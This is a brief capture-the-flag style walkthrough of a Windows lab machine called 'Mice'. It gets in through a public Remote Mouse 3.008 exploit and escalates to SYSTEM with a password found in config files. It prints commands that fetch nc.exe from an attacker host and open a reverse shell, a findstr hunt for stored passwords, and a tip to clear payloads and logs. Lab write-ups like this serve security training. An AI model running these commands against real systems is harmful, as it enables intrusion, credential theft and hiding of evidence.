# 🏴 Mice (Windows)

## 🧠 Initial Foothold

- Performed an initial port scan and discovered port 1978/tcp open, running Emote Remote Mouse.

- Searched for a relevant exploit and found:  
  [RemoteMouse-3.008-Exploit](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit)

- Cloned the repository and executed:
  ```bash
  python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.216.199 --cmd 'powershell -c "curl http://192.168.45.179/nc.exe -o C:\Windows\Temp\nc.exe"'
  python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.216.199 --cmd 'C:\Windows\Temp\nc.exe 192.168.45.179 80 -e cmd'
  ```

- Successfully gained a reverse shell on port 80.

---

## 🚀 Privilege Escalation

- Searched for passwords within local configuration files using:
  ```cmd
  findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml
  ```

- Found a base64-encoded password, decoded it, and used the credentials to connect via RDP.

- When encountering errors, ran the following commands in PowerShell to restart the Explorer process:
  ```powershell
  Stop-Process -Name explorer
  Start-Process explorer
  ```

- Followed additional steps as outlined in exploit:  
  [50047.txt](https://www.exploit-db.com/exploits/50047)

- Successfully obtained SYSTEM-level access.

---

🧼 **Post-Exploitation Note:**  
Consider clearing downloaded payloads and logs if necessary.

> ⚠️ This walkthrough is for educational purposes only.
